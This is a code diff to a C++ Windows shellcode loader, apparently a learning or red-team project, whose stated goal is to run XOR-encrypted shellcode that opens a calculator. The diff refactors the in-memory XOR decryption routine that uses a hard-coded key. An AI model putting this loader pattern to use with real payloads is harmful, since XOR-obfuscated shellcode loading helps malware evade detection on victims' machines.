@@ -1,7 +1,7 @@
 // This program's goal is to try to create a new process to execute a shellcode that will open a calculator
 
 #include <windows.h>
-#include <iostream>
+#include <string>
 
 #ifdef SHELLCODE_PATH
 #include SHELLCODE_PATH
@@ -12,11 +12,11 @@
 unsigned char key[] = "salut";
 
 // This function will xor the payload with the key in order to decrypt it
-void decrypt_payload(unsigned char* payload, unsigned int payload_size, unsigned char key[], unsigned int key_size)
+void decrypt_payload(unsigned char* payload, unsigned int payload_size, const unsigned char xor_key[], unsigned int key_size)
 {
 	for (unsigned int i = 0; i < payload_size; i++)
 	{
-		payload[i] ^= key[i % key_size];
+		payload[i] ^= xor_key[i % key_size];
 	}
 }
 
@@ -58,7 +58,7 @@ int main()
 #endif
 
 	// Decrypt the payload
-	decrypt_payload((unsigned char*) memory, sizeof(shellcode), key, sizeof(key));
+	decrypt_payload((unsigned char*) memory, sizeof(shellcode), key, strlen((char*) key));
 
 #if DEBUG
 	printf("Shellcode decrypted\n");
